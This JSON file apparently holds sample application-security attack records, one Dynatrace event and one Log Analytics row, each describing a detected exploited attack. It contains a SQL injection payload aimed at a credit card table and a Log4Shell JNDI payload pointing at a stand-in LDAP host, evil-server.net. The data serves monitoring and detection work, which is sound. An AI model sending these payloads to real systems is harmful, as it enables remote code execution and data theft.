[
  {
    "attackId": "1669899719228_15460477499888122030",
    "displayId": "A-1NUHOE",
    "timestamp": 1669899719228,
    "displayName": "org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate()",
    "attackType": "SQL_INJECTION",
    "state": "EXPLOITED",
    "request": {
        "url": "http://test.invalid/insecure-app?username=%27%20OR%201%3D1%20--%200",
        "host": "test.invalid",
        "path": "/insecure-app",
        "protocolDetails": {
            "http": {
                "requestMethod": "GET",
                "headers": {
                    "values": [],
                    "truncationInfo": {
                        "truncated": false
                    }
                },
                "parameters": {
                    "values": [],
                    "truncationInfo": {
                        "truncated": false
                    }
                }
            }
        }
    },
    "entrypoint": {
        "codeLocation": null,
        "entrypointFunction": {
            "displayName": "org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(Filter, ServletRequest, ServletResponse)",
            "className": "org.springframework.web.filter.DelegatingFilterProxy",
            "functionName": "invokeDelegate",
            "parameterTypes": {
                "values": [
                    "Filter",
                    "ServletRequest",
                    "ServletResponse"
                ],
                "truncationInfo": {
                    "truncated": false
                }
            },
            "returnType": "void"
        },
        "payload": {
            "values": [
                {
                    "type": "HTTP_PARAMETER_VALUE",
                    "name": "username",
                    "value": "' OR 1=1 -- 0"
                }
            ],
            "truncationInfo": {
                "truncated": false
            }
        }
    },
    "vulnerability": {
        "vulnerabilityId": "5093729127434282581",
        "displayName": null,
        "codeLocation": null,
        "vulnerableFunction": {
            "displayName": "org.hibernate.query.sql.internal.NativeQueryImpl.execute(String)",
            "className": "org.hibernate.query.sql.internal.NativeQueryImpl",
            "functionName": "execute",
            "parameterTypes": {
                "values": [
                    "String"
                ],
                "truncationInfo": {
                    "truncated": false
                }
            },
            "returnType": "boolean"
        },
        "vulnerableFunctionInput": {
            "type": "SQL_STATEMENT",
            "inputSegments": [
                {
                    "value": "SELECT * FROM credit_card_info WHERE upper(lastName) = '",
                    "type": "REGULAR_INPUT"
                },
                {
                    "value": "' OR 1=1 -- 0",
                    "type": "MALICIOUS_INPUT"
                },
                {
                    "value": "'",
                    "type": "REGULAR_INPUT"
                }
            ]
        }
    },
    "attacker": {
        "sourceIp": "10.9.3.4",
        "location": {
            "countryCode": null,
            "country": null,
            "city": null
        }
    },
    "managementZones": [
        {
            "id": "2843874372046580667",
            "name": "Production"
        }
    ]
},
    {
      "TenantId": "0466271e-77e0-47ef-bc01-ee8177ca53ee",
      "SourceSystem": "OpsManager",
      "MG": "",
      "ManagementGroupName": "",
      "TimeGenerated [UTC]": "27/10/2023, 11:17:35.044",
      "Computer": "",
      "RawData": "",
      "entrypoint_codeLocation_displayName_s": "",
      "entrypoint_codeLocation_className_s": "",
      "entrypoint_codeLocation_functionName_s": "",
      "entrypoint_codeLocation_parameterTypes_values_s": "",
      "entrypoint_codeLocation_parameterTypes_truncationInfo_truncated_b": "",
      "entrypoint_codeLocation_returnType_s": "",
      "entrypoint_codeLocation_lineNumber_d": "",
      "attackId_s": "1698405124415_02195243643866821550",
      "displayId_s": "A-22DAIC",
      "timestamp_d": 1698410000000,
      "displayName_s": "javax.servlet.ServletRequestWrapper.getParameterValues()",
      "attackType_s": "JNDI_INJECTION",
      "technology_s": "JAVA",
      "state_s": "EXPLOITED",
      "request_url_s": "/",
      "request_path_s": "/",
      "request_protocolDetails_http_requestMethod_s": "GET",
      "request_protocolDetails_http_headers_values_s": [
        {
          "name": "x-client-ip",
          "value": "192.168.1.1"
        },
        {
          "name": "user-agent",
          "value": "axios/0.20.0"
        },
        {
          "name": "host",
          "value": "unguard-proxy-service"
        },
        {
          "name": "accept",
          "value": "application/json, text/plain, */*"
        },
        {
          "name": "x-dynatrace",
          "value": "FW4;-1743916453;7;-359533746;498416;2;-860574453;372;d30e;2h02;3h87179aa2;4h0f4988;5h01;6heed8e7bffd3835c46961d6ded2ae3e75;7h59eb10f60139ab11"
        },
        {
          "name": "traceparent",
          "value": "00-eed8e7bffd3835c46961d6ded2ae3e75-59eb10f60139ab11-01"
        },
        {
          "name": "tracestate",
          "value": "ccb4ad0b-980df25b@dt=fw4;7;ea91f34e;79af0;2;0;0;174;a886;2h02;3h87179aa2;4h0f4988;5h01;7h59eb10f60139ab11"
        },
        {
          "name": "connection",
          "value": "close"
        }
      ],
      "request_protocolDetails_http_headers_truncationInfo_s": {
        "truncated": false
      },
      "request_protocolDetails_http_parameters_values_s": [],
      "request_protocolDetails_http_parameters_truncationInfo_s": {
        "truncated": true
      },
      "entrypoint_entrypointFunction_displayName_s": "ServletRequestWrapper.getParameterValues(String)",
      "entrypoint_entrypointFunction_className_s": "javax.servlet.ServletRequestWrapper",
      "entrypoint_entrypointFunction_functionName_s": "getParameterValues",
      "entrypoint_entrypointFunction_parameterTypes_values_s": [
        "String"
      ],
      "entrypoint_entrypointFunction_parameterTypes_truncationInfo_truncated_b": "FALSE",
      "entrypoint_entrypointFunction_returnType_s": "java.lang.String[]",
      "entrypoint_payload_values_s": [
        {
          "type": "HTTP_PARAMETER_VALUE",
          "name": "url",
          "value": "${jndi:ldap://evil-server.net:999/CompromiseMachine}"
        }
      ],
      "entrypoint_payload_truncationInfo_truncated_b": "FALSE",
      "vulnerability_vulnerabilityId_s": -7037980000000000000,
      "vulnerability_displayName_s": "JndiManager.lookup():128",
      "vulnerability_codeLocation_displayName_s": "org.apache.logging.log4j.core.net.JndiManager.lookup(String):128",
      "vulnerability_codeLocation_className_s": "org.apache.logging.log4j.core.net.JndiManager",
      "vulnerability_codeLocation_functionName_s": "lookup",
      "vulnerability_codeLocation_parameterTypes_values_s": [
        "String"
      ],
      "vulnerability_codeLocation_parameterTypes_truncationInfo_truncated_b": "FALSE",
      "vulnerability_codeLocation_returnType_s": "java.lang.Object",
      "vulnerability_codeLocation_lineNumber_d": 128,
      "vulnerability_vulnerableFunction_displayName_s": "InitialContext.lookup(String)",
      "vulnerability_vulnerableFunction_className_s": "javax.naming.InitialContext",
      "vulnerability_vulnerableFunction_functionName_s": "lookup",
      "vulnerability_vulnerableFunction_parameterTypes_values_s": [
        "String"
      ],
      "vulnerability_vulnerableFunction_parameterTypes_truncationInfo_truncated_b": "FALSE",
      "vulnerability_vulnerableFunction_returnType_s": "java.lang.Object",
      "vulnerability_vulnerableFunctionInput_type_s": "JNDI",
      "vulnerability_vulnerableFunctionInput_inputSegments_s": [
        {
          "value": "ldap://evil-server.net:999/CompromiseMachine",
          "type": "MALICIOUS_INPUT"
        }
      ],
      "attacker_sourceIp_s": "192.168.1.1",
      "attacker_location_countryCode_s": "DE",
      "attacker_location_country_s": "Germany",
      "attacker_location_city_s": "Rottenburg",
      "managementZones_s": [
        {
          "id": "2843874372046580667",
          "name": "Dev2Dev Demo 2"
        },
        {
          "id": "2631544906797876001",
          "name": "Infrastructure Linux (incl PG)"
        },
        {
          "id": "5996194749094481086",
          "name": "XXXXX-TestZone"
        },
        {
          "id": "1674365597043557983",
          "name": "XXXX Test"
        },
        {
          "id": "8696294048462936180",
          "name": "excemptions test"
        },
        {
          "id": "8097065485878182312",
          "name": "java"
        },
        {
          "id": "-8367998469205081223",
          "name": "pgTestMz"
        },
        {
          "id": "-2661345213750943630",
          "name": "XXXXX-java-MZ"
        },
        {
          "id": "-432603006836851299",
          "name": "XXXX-mz"
        },
        {
          "id": "5322819311624991300",
          "name": "unguard"
        }
      ],
      "Type": "DynatraceAttacks_CL",
      "_ResourceId": ""
    }
  ]